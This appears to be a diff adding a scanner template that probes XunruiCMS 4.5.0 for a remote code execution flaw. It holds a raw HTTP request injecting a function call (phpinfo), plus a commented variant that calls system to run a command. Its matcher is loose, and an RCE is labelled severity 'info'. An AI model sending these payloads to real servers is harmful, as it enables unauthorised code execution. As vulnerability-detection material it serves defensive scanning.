@@ -1,0 +1,28 @@
+id: xunruicms-index-rce
+info:
+  name: xunruicms-index-rce
+  author: apple
+  severity: info
+  description: 迅睿CMSXUNRUICMS4.5.0版本api_related_html文件存在远程代码执行漏洞.
+  reference:
+    - https://xz.aliyun.com/t/10002
+    - https://xz.aliyun.com/t/11457
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /index.php?s=api&c=api&m=template&app=admin&name=api_related.html&phpcmf_dir=admin&mid=%20action=function%20name=phpinfo%20param0=-1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"code"'
+#http://localhost:2333/index.php?s=api&c=api&m=template&app=admin&name=api_related.html&phpcmf_dir=admin&mid= action=function name=system param0=calc
